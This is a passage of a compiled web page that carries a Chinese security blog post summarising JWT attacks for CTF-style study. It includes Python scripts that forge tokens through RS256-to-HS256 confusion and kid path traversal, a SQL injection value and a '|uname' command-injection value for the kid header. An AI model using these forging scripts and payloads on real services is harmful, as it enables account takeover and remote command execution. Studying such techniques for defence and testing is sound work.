"从RSA256转为HS256方式绕过签名"'},"​")],-1),T=s("p",null,[i("关于该绕过最初的讨论"),s("a",{href:"https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",target:"_blank",rel:"noreferrer"},"https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"),i(".")],-1),V=s("p",null,"基于RSA256的加密的机制是非对称性的，它依赖于公钥去验证有效性，但是生成新的签名则需要私钥。而HMAC则在Sign和Verify上，使用的同一secret",-1),O=s("p",null,[i("在保证可以换加密方式的前提下（基于场景判断），例如，verfy签名时，调用方法"),s("code",null,"verify(public_key, data)"),i(" ，如果换成HMAC时，校验签名有效性时，使用的是同一scret，这就导致，我们使用HMAC 签名的token可以保证通过verify。")],-1),P=s("p",null,"我的python脚本",-1),R=s("div",{class:"language-python vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"python"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[s("code",{"v-pre":""},[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," base64")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," hmac")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," hashlib")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"with"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," open"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'public.pem'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},","),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'rb'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},") "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"as"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," f:")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"public_key "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," f.read()")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"print"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(public_key)")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"msg "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},".encode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"sig "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," base64.urlsafe_b64encode(hmac.new(public_key,msg,hashlib.sha256).digest()).decode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},").rstrip("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'='"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"print"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"("),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"type"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(msg))")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"print"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(msg.decode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},") "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"+"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '.'"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," +"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," sig)")])])]),s("button",{class:"collapse"})],-1),W=s("h3",{id:"利用kid读取文件实现伪造身份",tabindex:"-1"},[i("利用kid读取文件实现伪造身份 "),s("a",{class:"header-anchor",href:"#利用kid读取文件实现伪造身份","aria-label":'Permalink to "利用kid读取文件实现伪造身份"'},"​")],-1),N=s("p",null,"可以利用kid进行新的有效签名",-1),x=s("ol",null,[s("li",null,[s("p",null,[i("提取header部分，将kid换成 "),s("code",null,"../../../../../../../../../dev/null")])]),s("li",null,[s("p",null,"此时secret换成空")]),s("li",null,[s("p",null,"进行sha256加密")])],-1),z=s("p",null,"参考脚本如下",-1),H=s("div",{class:"language-python vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"python"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[s("code",{"v-pre":""},[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," hmac")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," base64")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," hashlib")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"changed_data "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VyIjoiYWRtaW4ifQ"')]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"secret "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' ""'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},".encode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"new_sign "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," hmac.new(secret,changed_data.encode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"),hashlib.sha256).digest()")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"new_sign "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," base64.urlsafe_b64encode(new_sign).decode("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'utf-8'"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},").rstrip("),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'='"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"print"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"(changed_data "),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"+"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '.'"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," +"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," new_sign)")])])]),s("button",{class:"collapse"})],-1),Q=s("h3",{id:"利用kid实现sql注入",tabindex:"-1"},[i("利用kid实现sql注入 "),s("a",{class:"header-anchor",href:"#利用kid实现sql注入","aria-label":'Permalink to "利用kid实现sql注入"'},"​")],-1),q=s("p",null,"原理是一样的，将kid使用",-1),G=s("div",{class:"language- vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"}),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[s("code",{"v-pre":""},[s("span",{class:"line"},[s("span",null,"random-string ' UNION SELECT 'secret")])])]),s("button",{class:"collapse"})],-1),K=s("p",null,[i("然后生成签名时，使用"),s("code",null,"secret"),i(" 来生成。原理其实是和读取文件伪造身份是一样的。脚本也可以参考刚那个脚本")],-1),U=s("h3",{id:"利用kid实现rce",tabindex:"-1"},[i("利用kid实现rce "),s("a",{class:"header-anchor",href:"#利用kid实现rce","aria-label":'Permalink to "利用kid实现rce"'},"​")],-1),M=s("p",null,"例如CVE-2017-17405，是 Ruby library Net::FTP下的一个漏洞，会读取header下的kid的key-value，并且该过程发生在校验签名前。所以无需有效签名，即可实现任意文件读取&任意命令执行",-1),X=s("p",null,"关键函数调用有：",-1),Z=s("div",{class:"language- vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"}),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[s("code",{"v-pre":""},[s("span",{class:"line"},[s("span",null,"File.open(....)")])])]),s("button",{class:"collapse"})],-1),Y=s("div",{class:"language- vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"}),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[s("code",{"v-pre":""},[s("span",{class:"line"},[s("span",null,"open(....)")])])]),s("button",{class:"collapse"})],-1),ss=s("p",null,"直接jwt.io解jwt，然后把header部分增加kid和对应的执行命令，例如：",-1),is=s("div",{class:"language-json vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"json"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[s("code",{"v-pre":""},[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},'"typ"'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},": "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"JWT"'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},",")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},'"alg"'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},": "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"HS256"'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},",")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},'"kid"'),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},": "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"|uname"')]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"}")])])]),s("button",{class:"collapse"})],-1),ls=s("p",null,"则会立刻执行对应命令",-1),as=s("h2",{id:"reference",tabindex:"-1"},[i("Reference "),s("a",{class:"header-anchor",href:"#reference","aria-label":'Permalink to "Reference"'},"​")],-1),ns=s("ul",null,[s("li",null,[s("p",null,"Pentesterlab 「推荐」 建议若能赶上黑五尾巴赶紧入一个pro")]),s("li",null,[s("p",null,[s("a",{href:"https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",target:"_blank",rel:"noreferrer"},"https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"),i(".")])])],-1),gs={__name:"jwt-crack-zong-jie",setup(es,{expose:p}){const e=JSON.parse('{"title":"JWT Crack总结 （一）","description":"","frontmatter":{"title":"JWT Crack总结 （一）","date":"2022-11-24T23:06:39.000Z","tags":["jwt","ctf","Infosec"],"published":true,"hideInList":false,"feature":null,"isTop":false},"headers":[{"level":2,"title":"场景总结","slug":"场景总结","link":"#场景总结","children":[{"level":3,"title":"加密可取消","slug":"加密可取消","link":"#加密可取消","children":[]},{"level":3,"title":"公钥泄漏","slug":"公钥泄漏","link":"#公钥泄漏","children":[]},{"level":3,"title":"加密方式可爆破","slug":"加密方式可爆破","link":"#加密方式可爆破","children":[]},{"level":3,"title":"从RSA256转为HS256方式绕过签名","slug":"从rsa256转为hs256方式绕过签名","link":"#从rsa256转为hs256方式绕过签名","children":[]},{"level":3,"title":"利用kid读取文件实现伪造身份","slug":"利用kid读取文件实现伪造身份","link":"#利用kid读取文件实现伪造身份","children":[]},{"level":3,"title":"利用kid实现sql注入","slug":"利用kid实现sql注入","link":"#利用kid实现sql注入","children":[]},{"level":3,"title":"利用kid实现rce","slug":"利用kid实现rce","link":"#利用kid实现rce","children":[]}]},{"level":2,"title":"Reference","slug":"reference","link":"#reference","children":[]}],"relativePath":"pages/posts/history/jwt-crack-zong-jie.md","path":"/home/runner/work/1dayluo.github.io/1dayluo.github.io/pages/posts/history/jwt-crack-zong-jie.md","lastUpdated":1714218709000}'),t=d(),h=e.frontmatter||{};return t.meta.frontmatter=Object.assign(t.meta.frontmatter||{},e.frontmatter||{}),k("pageData",e),k("valaxy:frontmatter",h),globalThis.$frontmatter=h,p({frontmatter:{title:"JWT Crack总结 （一）",date:"2022-11-24T23:06:39.000Z",tags:["jwt","ctf","Infosec"],published:!0,hideInList:!1,feature:null,isTop:!1}}),(a,ts)=>{const r=E;return c(),g(r,{frontmatter:y(h)},{"main-content-md":l(()=>[o,F,u,C,b,_,m,f,B,A,v,D,w,j,J,I,L,S,$,T,V,O,P,R,W,N,x,z,H,Q,q,G,K,U,M,X,Z,Y,ss,is,ls,as,ns]),"main-header":l(()=>[n(a.$slots,"main-header")]),"main-header-after":l(()=>[n(a.$slots,"main-header-after")]),"main-nav":l(()=>[n(a.$slots,"main-nav")]),"main-content":l(()=>[n(a.$slots,"main-content")]),"main-content-after":l(()=>[n(a.$slots,"main-content-after")]),"main-nav-before":l(()=>[n(a.$slots,"main-nav-before")]),"main-nav-after":l(()=>[n(a.$slots,"main-nav-after")]),comment:l(()=>[n(a.$slots,"comment")]),footer:l(()=>[n(a.$slots,"footer")]),aside:l(()=>[n(a.$slots,"aside")]),"aside-custom":l(()=>[n(a.$slots,"aside-custom")]),default:l(()=>[n(a.$slots,"default")]),_:3},8,["frontmatter"])}}};export{gs as default};
